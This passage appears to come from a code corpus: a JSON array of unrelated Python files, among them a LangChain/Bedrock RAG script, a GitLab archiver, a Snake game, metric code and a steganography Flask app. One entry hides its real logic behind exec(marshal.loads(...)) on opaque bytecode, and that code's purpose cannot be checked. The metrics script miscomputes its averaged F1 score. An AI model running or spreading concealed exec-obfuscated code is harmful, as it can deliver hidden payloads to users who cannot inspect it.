image=self.img_solveicon, compound=\"top\")\n        self.solvebutton.place(anchor=\"s\", height=150, width=150, x=700, y=200)\n        self.solvebutton.bind(\"<ButtonPress>\", self.solve)\n\n        # Objek untuk menampilkan animasi loading (GIF)\n        self.gif_loading = tk.Label(self.appFrame)\n\n        # Dropdown menu untuk memilih algoritma pencarian\n        self.algorithmbox = ttk.Combobox(self.appFrame)\n        self.algorithmbox.configure(cursor=\"hand2\", state=\"readonly\",\n   ",
    "import json\nimport os\nimport boto3\nimport sys\n\nimport numpy as np\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_community.document_loaders import PyPDFDirectoryLoader\n\n## vector embedding and vector store\nfrom langchain.vectorstores.faiss import FAISS\nfrom langchain_community.embeddings import BedrockEmbeddings\nfrom langchain.llms.bedrock import Bedrock\n\n\nfrom langchain.prompts import PromptTemplate\nfrom langchain.chains.retrieval_qa import RetrievalQA\n\n## bedrock client\nbedrock = boto3.client(service_name = \"bedrock-runtime\")\n\n## embedding\nbedrock_embedding = BedrockEmbeddings(model_id=\"amazon.titan-embed-text-v1\", client=bedrock)\n\n## data ingestion\ndef data_ingestion():\n    Loader = PyPDFDirectoryLoader(\"data\")\n    Documents = Loader.load()\n\n    ## defining the text splitter\n    text_splitter = RecursiveCharacterTextSplitter(separators=[\"\\n\",\"\\n\\n\"], chunk_size = 10000, chunk_overlap = 1000)\n\n    docs = text_splitter.split_documents(Documents)\n    return docs\n\n## create the vector store\ndef getVectorStore(docs):\n    vector_store_faiss = FAISS.from_documents(\n        docs,\n        bedrock_embedding\n    )\n    vector_store_faiss.save_local(\"faiss_index\")\n\n## get llama2 model\ndef get_llama2_llm():\n    llm = Bedrock(model_id=\"meta.llama2-70b-chat-v1\", client=bedrock, model_kwargs={\"temperature\":0.8})\n    return llm\n\n## get titan model\ndef get_titan_llm():\n    llm = Bedrock(model_id=\"amazon.titan-text-express-v1\", client=bedrock, model_kwargs={\"maxTokenCount\":512})\n    return llm\n\n## get mistralAI model\ndef get_mistral_llm():\n    llm = Bedrock(model_id=\"mistral.mistral-large-2402-v1:0\", client=bedrock, model_kwargs={\"max_tokens\":512})\n    return llm\n\nprompt_template = \"\"\"\n\nHuman: Use the following context to provide a concise answer to the question at the end but use atleast summarize with \n200 words with detailed explanations. If you don't know the answer,just say that you don't know, don't hallucinate.\n<context>\n{context}\n</context\n\nQuestion: {question}\n\nAssistant:\"\"\"\n\nPROMPT = PromptTemplate(\n    template=prompt_template, input_variables=[\"context\", \"question\"]\n)\n\n\ndef get_response(llm, vector_store_faiss, query):\n    response = RetrievalQA.from_llm(\n        llm=llm,\n        chain_type=\"stuff\",\n        retriever=vector_store_faiss.as_retriever(\n            search_type=\"similarity\", search_kwargs={\"k\": 4}\n        ),\n        return_source_documents=True,\n        chain_type_kwargs={\"prompt\": PROMPT}\n    )\n    answer=response({\"query\":query})\n    return answer['result']\n",
    "import os\nimport subprocess\nfrom datetime import datetime\nfrom enum import Enum\n\nimport gitlab\nimport prompt_toolkit.shortcuts\nfrom dotenv import load_dotenv\nimport questionary\nfrom gitlab.v4.objects import Project\nfrom dateutil import parser\nfrom git import Repo\nfrom tempfile import TemporaryDirectory\n\nload_dotenv()\n\n\nclass ArchiveMode(Enum):\n    SINGLE_REPO = 1\n    DOWNLOAD_AND_DELETE = 2\n    DELETE = 3\n\n    def __str__(self):\n        if self == ArchiveMode.SINGLE_REPO:\n            return \"Archive into single repo\"\n        elif self == ArchiveMode.DOWNLOAD_AND_DELETE:\n            return \"Download archives and delete\"\n        elif self == ArchiveMode.DELETE:\n            return \"Delete without saving\"\n\n    @staticmethod\n    def from_str(mode: str) -> \"ArchiveMode\":\n        for enum in ArchiveMode:\n            if str(enum) == mode:\n                return enum\n        raise ValueError(f\"Invalid mode: {mode}\")\n\n\ndef main():\n    gl = gitlab.Gitlab(url=os.environ.get(\"GITLAB_SERVER\"),\n                       private_token=os.environ.get(\"GITLAB_TOKEN\"))\n    gl.auth()\n    user = gl.user\n    project_limit = user.projects_limit\n    projects: list[Project] = gl.projects.list(get_all=True, owned=True,\n                                               order_by=\"last_activity_at\")\n    project_descriptors = {\n        f\"{project.name_with_namespace} (Last activity {parser.parse(project.last_activity_at).strftime(\"%m/%d/%Y, %H:%M\")})\": project\n        for project in projects}\n    project_count = len(projects)\n    remaining_projects = project_limit - project_count\n    if remaining_projects <= 0:\n        questionary.print(\n            f\"You have reached the project limit of {project_limit} projects. \"\n            f\"You will need to delete one or more projects manually to use \"\n            f\"the 'Archive into single repo' mode.\",\n            style=\"bold fg:red\")\n    elif remaining_projects <= 5:\n        questionary.print(\n            f\"You have {remaining_projects} projects left before reaching the \"\n            f\"project limit of {project_limit}.\",\n            style=\"bold fg:yellow\")\n    else:\n        questionary.print(\n            f\"You have {remaining_projects} projects left before reaching the \"\n            f\"project limit of {project_limit}.\",\n            style=\"bold fg:green\")\n    questionary.press_any_key_to_continue().ask()\n    projects_to_archive = questionary.checkbox(\n        \"Select projects to archive\", choices=project_descriptors).ask()\n    archival_mode = questionary.select(\n        \"Select archival mode\",\n        choices=[str(mode) for mode in ArchiveMode]).ask()\n    archival_mode_enum = ArchiveMode.from_str(archival_mode)\n    if archival_mode_enum == ArchiveMode.SINGLE_REPO:\n        ssh_or_https = questionary.select(\n            \"Select protocol for cloning\",\n            choices=[\"SSH\", \"HTTPS\"], default=\"SSH\").ask()\n        if ssh_or_https == \"SSH\":\n            # Verify that the user has set up SSH keys\n            ssh_proc = subprocess.run(\n                [\"ssh\", \"-T\", \"git@gitlab.cecs.anu.edu.au\"],\n                capture_output=True)\n            if ssh_proc.returncode != 0:\n                questionary.print(\"You need to set up SSH keys before using \"\n                                  \"this mode.\",\n                                  style=\"bold fg:red\")\n                return\n            else:\n                questionary.print(\"SSH keys are set up already!\",\n                                  style=\"bold fg:green\")\n        else:\n            # Verify that the user has set up HTTPS credentials\n            # idk how to do this so get rekt if you use HTTPS\n            questionary.print(\n                \"You may get prompted for your GitLab username and password.\",\n                style=\"bold fg:yellow\")\n        tmp_dir = TemporaryDirectory(\"_gitlab-archive\")\n        questionary.print(f\"Created temporary directory {tmp_dir.name}\",\n                          style=\"italic fg:green\")\n        main_repo = Repo.init(tmp_dir.name)\n        questionary.print(f\"Initialized main repository in {tmp_dir.name}\",\n                          style=\"italic fg:green\")\n        upstream_project_id = f\"project-archive-{datetime.now().strftime(\n            '%Y-%m-%d-%H-%M-%S')}\"\n        upstream_project = gl.projects.create({'name': upstream_project_id})\n        questionary.print(f\"Created upstream project {upstream_project_id}\",\n                          style=\"italic fg:green\")\n        main_repo.create_remote(\"origin\", upstream_project.ssh_url_to_repo\n        if ssh_or_https == \"SSH\"\n        else upstream_project.http_url_to_repo)\n        for project_descriptor in projects_to_archive:\n            project = project_descriptors[project_descriptor]\n            project_id = str(project.id)\n            project_remote = main_repo.create_remote(project_id,\n                                                     project.ssh_url_to_repo\n                                                     if ssh_or_https == \"SSH\"\n                                   ",
    "import pygame\n\npygame.init()\n\nFPS = 8\nWIDTH = 1280\nHEIGHT = 720\nTITLE = \"Snake\"\nTILE_SIZE = 40\nBACKGROUND_COLORS = [(20, 240, 20), (20, 200, 20)]\nSNAKE_COLOR = (0, 0, 255)\nAPPLE_COLOR = (200, 20, 20)\n\nclass Snake:\n    def __init__(self) -> None:\n        self.reset()\n    \n    def reset(self) -> None:\n        self.body = [(1, 1), (2, 1), (3, 1)]\n        self.direction = (1, 0)\n\n    def change_direction(self, direction) -> None:\n        if direction == \"UP\" and self.direction != (0, 1):\n            self.direction = (0, -1)\n        elif direction == \"DOWN\" and self.direction != (0, -1):\n            self.direction = (0, 1)\n        elif direction == \"LEFT\" and self.direction != (1, 0):\n            self.direction = (-1, 0)\n        elif direction == \"RIGHT\" and self.direction != (-1, 0):\n            self.direction = (1, 0)\n\n    def move(self) -> None:\n        head = self.body[-1]\n        new_head = (head[0] + self.direction[0], head[1] + self.direction[1])\n        self.body.pop(0)\n        self.body.append(new_head)\n\n    def grow(self) -> None:\n        head = self.body[-1]\n        new_head = (head[0] + self.direction[0], head[1] + self.direction[1])\n        self.body.append(new_head)\n    \n    def check_collision(self) -> bool:\n        head = self.body[-1]\n        for x, y in self.body[:-1]:\n            if head == (x, y):\n                return True\n\n        return False\n\n    def check_boundaries(self) -> bool:\n        head = self.body[-1]\n        if head[0] < 0 or head[0] >= WIDTH // TILE_SIZE or head[1] < 0 or head[1] >= HEIGHT // TILE_SIZE:\n            return True\n\n        return False\n\n    def check_apple(self, apple) -> bool:\n        head = self.body[-1]\n        return head == apple.position\n\n    def get_score(self) -> int:\n        return len(self.body) - 3\n\n    def draw(self, screen) -> None:\n        for i, (x, y) in enumerate(self.body):\n            color = tuple(map(lambda x: x * i // len(self.body), SNAKE_COLOR))\n            pygame.draw.rect(screen, color, (x * TILE_SIZE + TILE_SIZE // 4, y * TILE_SIZE + TILE_SIZE // 4, TILE_SIZE // 2, TILE_SIZE // 2))\n\nclass Apple:\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.position = (pygame.time.get_ticks() % (WIDTH // TILE_SIZE), pygame.time.get_ticks() % (HEIGHT // TILE_SIZE))\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, APPLE_COLOR, (self.position[0] * TILE_SIZE + TILE_SIZE // 2, self.position[1] * TILE_SIZE + TILE_SIZE // 2), TILE_SIZE // 2)\n\nsnake = Snake()\napple = Apple()\n\npygame.display.set_caption(TITLE)\nscreen = pygame.display.set_mode([1280, 720], pygame.RESIZABLE, 32, 0, 0)\ngame_over = False\ntotalDelta = 0\n\nrunning = True\nwhile running:\n    start = pygame.time.get_ticks()\n\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_UP]:\n        snake.change_direction(\"UP\")\n    elif keys[pygame.K_DOWN]:\n        snake.change_direction(\"DOWN\")\n    elif keys[pygame.K_LEFT]:\n        snake.change_direction(\"LEFT\")\n    elif keys[pygame.K_RIGHT]:\n        snake.change_direction(\"RIGHT\")\n    elif game_over:\n        continue\n\n    game_over = False\n    end = pygame.time.get_ticks()\n    delta = end - start\n    if totalDelta + delta < 1000 / FPS:\n        totalDelta += delta\n        continue\n\n    totalDelta = 0\n\n    snake.move()\n    if snake.check_collision() or snake.check_boundaries():\n        score = snake.get_score()\n        snake.reset()\n\n        font = pygame.font.Font(None, 74)\n        text = font.render(f\"Game Over! Score: {score}\", True, (255, 255, 255))\n        text_rect = text.get_rect(center=(WIDTH // 2, HEIGHT // 2))\n        screen.blit(text, text_rect)\n        pygame.display.flip()\n        game_over = True\n        continue\n\n    if snake.check_apple(apple):\n        snake.grow()\n        apple.reset()\n\n    screen.fill((0, 0, 0))\n    for x in range(0, WIDTH, TILE_SIZE):\n        for y in range(0, HEIGHT, TILE_SIZE):\n            color = BACKGROUND_COLORS[(x + y) // TILE_SIZE % 2]\n            pygame.draw.rect(screen, color, (x, y, TILE_SIZE, TILE_SIZE))\n\n    apple.draw(screen)\n    snake.draw(screen)\n\n    pygame.display.flip()\n\npygame.quit()\n",
    "# -*- coding: utf-8 -*-\n\"\"\"metrics.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1Hk9RNaZnWjStaqsbc14EQgkfcFXw9a6b\n\"\"\"\n\nfrom nltk.translate.bleu_score import sentence_bleu\nimport nltk\n\ngenerated = [\n    [\"What\", \"is\", \"the\", \"difference\", \"between\", \"supervised\", \"and\", \"unsupervised\", \"machine\", \"learning\"],\n    [\"What\", \"are\", \"the\", \"different\", \"types\", \"of\", \"machine\", \"learning\", \"algorithms\"],\n    [\"How\", \"do\", \"you\", \"evaluate\", \"the\", \"performance\", \"of\", \"a\", \"machine\", \"learning\", \"model\"],\n    [\"What\", \"are\", \"some\", \"common\", \"applications\", \"of\", \"machine\", \"learning\", \"in\", \"industry\"],\n    [\"What\", \"are\", \"some\", \"challenges\", \"and\", \"limitations\", \"of\", \"machine\", \"learning\"]\n]\n\nreferences = [\n    [\"What\", \"is\", \"the\", \"Difference\", \"Between\", \"Supervised\", \"and\", \"Unsupervised\", \"Machine\", \"Learning\"],\n    [\"What\", \"are\", \"the\", \"Different\", \"types\", \"of\", \"Machine\", \"Learning\"],\n    [\"What\", \"is\", \"Overfitting\", \"and\", \"How\", \"Can\", \"You\", \"Avoid\", \"It\"],\n    [\"Can\", \"we\", \"use\", \"linear\", \"regression\", \"for \", \"classification\", \"tasks\"],\n    [\"What\", \"is\", \"Principal\", \"Component\",\"Analysis\"]]\n\ngenerated = [' '.join(sent).lower() for sent in generated]\nreferences = [' '.join(sent).lower() for sent in references]\n\n\ntotal = 0\nfor i, gen in enumerate(generated):\n    bleu_score = sentence_bleu([references[i]], gen)\n    total += bleu_score\n    print(\"BLEU Score for sentence {}: {:.2f}\".format(i+1, bleu_score))\n\navg_bleu = total / len(generated)\nprint(avg_bleu)\n\ndef f1_score(predicted, target):\n\n    predicted_set = set(predicted)\n    target_set = set(target)\n\n    tp = len(predicted_set.intersection(target_set))\n    fp = len(predicted_set.difference(target_set))\n    fn = len(target_set.difference(predicted_set))\n\n    precision = tp / (tp + fp) if (tp + fp) > 0 else 0\n    recall = tp / (tp + fn) if (tp + fn) > 0 else 0\n    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0\n\n    return f1\n\nfor i, gen in enumerate(generated):\n    f1 = f1_score(gen, references[i])\n    print(\"F1 Score for sentence {}: {:.2f}\".format(i+1, f1))\n\ntotal_f1_score = sum(f1_score(generated, references) for gen, ref in zip(generated, references))\naverage_f1_score = total_f1_score / len(generated)\nprint(\"\\nAverage F1 Score: {:.2f}\".format(average_f1_score))\n\n",
    "from flask import Flask, request, send_file, jsonify\nfrom PIL import Image\nfrom io import BytesIO\nfrom utils import validate_image_file, validate_secret_text\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Kleid -Steganography </title>\n  <link rel=\"stylesheet\" href=\"styles.css\">\n</head>\n<body>\n  <div class=\"container\">\n    <h1>Kleidl</h1>\n    <label for=\"original-image\">Select an image:</label>\n    <input type=\"file\" id=\"original-image\" accept=\"image/*\">\n    <label for=\"secret-text\">Enter secret text:</label>\n    <textarea id=\"secret-text\" rows=\"4\"></textarea>\n    <button id=\"hide-button\">Hide Text</button>\n  </div>\n\n  <script src=\"script.js\"></script>\n</body>\n</html>'''\n\n@app.route('/hide', methods=['POST'])\ndef hide_text():\n    original_image = request.files['image']\n    secret_text = request.form['secret_text']\n\n    # Validate image and secret text\n    try:\n        validate_image_file(original_image.filename)\n        validate_secret_text(secret_text)\n\n        img = Image.open(original_image)\n        binary_secret_text = ''.join(format(ord(char), '08b') for char in secret_text)\n        secret_text_length = len(binary_secret_text)\n        img_data = iter(img.getdata())\n\n        new_img_data = []\n        for i in range(secret_text_length):\n            pixel = next(img_data)\n            new_pixel = list(pixel)\n            new_pixel[-1] = int(binary_secret_text[i])\n            new_img_data.append(tuple(new_pixel))\n\n        img.putdata(new_img_data)\n\n        output_buffer = BytesIO()\n        img.save(output_buffer, format='PNG')\n        output_buffer.seek(0)\n\n        return send_file(output_buffer, attachment_filename='hidden_image.png', as_attachment=True)\n\n    except Exception as e:\n        return jsonify({'error': str(e)}), 400\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
    "import marshal \nexec(marshal.loads(b'\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\x8a\\x04\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x01Z\\x01d\\x00d\\x01l\\x02Z\\x02d\\x00d\\x01l\\x03Z\\x03d\\x00d\\x01l\\x04Z\\x04d\\x00d\\x01l\\x00Z\\x00d\\x00d\\x01l\\x05Z\\x05d\\x00d\\x01l\\x06Z\\x06d\\x00d\\x01l\\x07Z\\x07d\\x00d\\x01l\\x08Z\\x08d\\x00d\\x01l\\tZ\\td\\x00d\\x01l\\nZ\\nd\\x00d\\x01l\\x0bZ\\x0bd\\x00d\\x02l\\x02m\\x0cZ\\x0c\\x01\\x00d\\x00d\\x01l\\x06Z\\x06d\\x00d\\x03l\\x08m\\rZ\\r\\x01\\x00d\\x00d\\x04l\\x01m\\x0eZ\\x0em\\x0fZ\\x0f\\x01\\x00d\\x00d\\x05l\\x10m\\x11Z\\x11m\\x12Z\\x12m\\x13Z\\x13\\x01\\x00d\\x00d\\x06l\\x14m\\x15Z\\x15m\\x16Z\\x16\\x01\\x00d\\x07Z\\x17d\\x08Z\\x18d\\tZ\\x19d\\nZ\\x1ad\\x0bZ\\x1bd\\x0cZ\\x1cd\\rZ\\x1dd\\rZ\\x1ed\\x0eZ\\x1fd\\x08Z d\\x0fZ!d\\x00d\\x01l\\x08Z\\x08d\\x00d\\x01l\\nZ\"d\\x00d\\x01l\\x08Z#d\\x00d\\x01l$Z$e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0%\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z&\\x02\\x00e\\'e&j(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z#\\x02\\x00e\\'e&j)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z*\\x02\\x00e\\'e&j+\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z,\\x02\\x00e\\'e&j-\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z-\\x02\\x00e\\'e&j.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z/\\x02\\x00e\\'e&j0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z1e#d\\x10z\\x00\\x00\\x00e*z\\x00\\x00\\x00d\\x10z\\x00\\x00\\x00e,z\\x00\\x00\\x00d\\x11z\\x00\\x00\\x00e-z\\x00\\x00\\x00d\\x12z\\x00\\x00\\x00e/z\\x00\\x00\\x00d\\x12z\\x00\\x00\\x00e1z\\x00\\x00\\x00Z2e&j-\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z3e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z4\\x02\\x00e$j$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x13d\\x14d\\x15d\\x16d\\x00d\\x00\\xa6\\x06\\x00\\x00\\xab\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z5e4\\xa0\\r\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x17\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e5\\xa0\\r\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x17\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00k\\x04\\x00\\x00\\x00\\x00r\\x1b\\x02\\x00e6d\\x18\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\"j7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\\x03j8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x19\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x1aZ9\\x02\\x00G\\x00d\\x1b\\x84\\x00d\\x1c\\xa6\\x02\\x00\\x00\\xab\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z:e;d\\x1dk\\x02\\x00\\x00\\x00\\x00r\\x84\\x02\\x00e:\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Z<\\x02\\x00e\\x04j=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e<j>\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xac\\x1e\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0?\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x00e\\x04j=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00e<j@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xac\\x1e\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa0?\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00e<\\xa0A\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00e<\\xa0B\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\xab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00d\\x01S\\x00)\\x1f\\xe9\\x00\\x00\\x00\\x00N)\\x01\\xda\\x0bPrettyTable)\\x01\\xda\\x08strftime)\\x02\\xda\\x04init\\xda\\x04Fore)\\x03\\xda\\x08urlparse\\xda\\x07unquote\\xda\\x05quote)\\x02\\xda\\rascii_letters\\xda\\x06digitsz\\x07\\x1b[1;36m\\xfa\\x07\\x1b[1;31m\\xfa\\x07\\x1b[1;32m\\xfa\\x07\\x1b[1;33m\\xfa\\x07\\x1b[1;34m\\xfa\\x07\\x1b[1;35m\\xfa\\x07\\x1b[1;37mz\\x07\\x1b[0;31mz\\x04\\x1b[0m\\xfa\\x01/\\xfa\\x01 \\xfa\\x01:i\\xe8\\x07\\x00\\x00\\xe9\\x04\\x00\\x00\\x00\\xe9\\x0f\\x00\\x00\\x00\\xe9\\x01\\x00\\x00\\x00z\\x02%xz&Tool is outdated you can contact admin\\xda\\x05clearu+\\x04\\x00\\x00\\n\\x1b[1;91m\\xe2\\x94\\x8f\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x81\\xe2\\x94\\x93\\n\\x1b[1;91m\\xe2\\x94\\x83\\x1b[1;32m  ____ ___  _ _       \\x1b[1;32m_",
    "import subprocess\nimport re\n\ndef extract_exif_data(file_path):\n    \"\"\"\n    Extract EXIF data from an image file using ExifTool.\n\n    Args:\n        file_path (str): Path to the image file.\n\n    Returns:\n        dict: Extracted EXIF data as a dictionary, or None if extraction fails.\n    \"\"\"\n    try:\n        # Construct the ExifTool command\n        exiftool_path = r\"C:\\Program Files\\exiftool.exe\"  # Replace with the actual path to exiftool.exe\n        exiftool_cmd = [\n            exiftool_path,\n            '-s',\n            '-s',\n            '-GimbalRollDegree',\n            '-GimbalPitchDegree',\n            '-GimbalYawDegree',\n            '-FileName',\n            file_path\n        ]\n\n        # Run the ExifTool command and capture the output\n        output = subprocess.check_output(exiftool_cmd, universal_newlines=True)\n\n        # Parse the output to extract the desired values\n        gimbal_roll = re.search(r'GimbalRollDegree:\\s*([-+]?\\d+\\.\\d+)', output)\n        gimbal_pitch = re.search(r'GimbalPitchDegree:\\s*([-+]?\\d+\\.\\d+)', output)\n        gimbal_yaw = re.search(r'GimbalYawDegree:\\s*([-+]?\\d+\\.\\d+)', output)\n        image_name = re.search(r'FileName:\\s*(.+)', output)\n\n        if gimbal_roll and gimbal_pitch and gimbal_yaw and image_name:\n            gimbal_roll = float(gimbal_roll.group(1))\n            gimbal_pitch = float(gimbal_pitch.group(1))\n            gimbal_yaw = float(gimbal_yaw.group(1))\n            image_name = image_name.group(1)\n\n            return {\n                'Gimbal Roll': gimbal_roll,\n                'Gimbal Pitch': gimbal_pitch,\n                'Gimbal Yaw': gimbal_yaw,\n                'Image Name': image_name\n            }\n        else:\n            print(\"Gimbal Roll, Pitch, and Yaw degrees or Image Name not found in the ExifTool output.\")\n\n    except subprocess.CalledProcessError as e:\n        print(f\"Error running ExifTool: {e}\")\n    except Exception as e:\n        print(f\"Error processing file '{file_path}': {e}\")\n\n    return None\n",
    "import logging\nimport configparser\nimport argparse\nimport os\nfrom PyPDF2 import PdfReader, PdfWriter\nfrom concurrent.futures import ThreadPoolExecutor\nfrom find import find_subdocuments\n\nlogging.basicConfig(\n    filename=\"ocr.log\",\n    level=logging.INFO,\n    format=\"%(asctime)s - %(levelname)s - %(message)s\",\n)\n\n\ndef parse_settings(settings):\n    ocr_settings = {}\n\n    for i in range(1, len(settings), 2):\n        text_key = settings[i - 1][1].strip('\"')\n        loc_values = tuple(map(int, settings[i][1].split(\",\")))\n        ocr_settings[text_key] = loc_values\n\n    return ocr_settings\n\n\n# Function to split the pdfs\ndef split_into_pdfs(input_directory, file, output_directory, text_and_pages):\n    try:\n        flag = False\n        print(\"Splitting \" + file)\n        inputpdf = PdfReader(open(input_directory + \"/\" + file, \"rb\"))\n        filename = file.split(\".\")[0]\n        curr_index = 0\n        for index, (label, page_number) in enumerate(text_and_pages):\n            output = PdfWriter()\n            start_page = page_number - 1  # Adjust to 0-based index\n            end_page = (\n                text_and_pages[index + 1][1] - 1\n                if index < len(text_and_pages) - 1\n                else page_number\n            )\n            curr_index = max(curr_index, end_page)\n            for i in range(start_page, end_page):\n                output.add_page(inputpdf.pages[i])\n            with open(\n                f\"{output_directory}/{filename}_{label.title()}.pdf\", \"wb\"\n            ) as outputStream:\n                flag = True\n                output.write(outputStream)\n        # edge case - leftover pages\n        if curr_index < len(inputpdf.pages):\n            output = PdfWriter()\n            for i in range(curr_index, len(inputpdf.pages)):\n                output.add_page(inputpdf.pages[i])\n            with open(f\"{output_directory}/{filename}_extra.pdf\", \"wb\") as outputStream:\n                output.write(outputStream)\n        if flag:\n            print(file, \"saved to \" + output_directory)\n        else:\n            print(\"Nothing saved! Double check the rectangle coordinates -\", file)\n            logging.error(\"Check coordinates\")\n    except Exception as e:\n        print(\"Something went wrong! Double check the pdf file:\", e)\n        logging.error(e)\n        return\n\n\ndef process_file(file):\n    text_and_pages = find_subdocuments(input_directory + \"/\" + file, ocr_settings)\n    split_into_pdfs(input_directory, file, output_directory, text_and_pages)\n\n\ndef main():\n    global input_directory, output_directory, ocr_settings\n\n    parser = argparse.ArgumentParser(description=\"Process some files.\")\n    parser.add_argument(\"--config\", type=str, 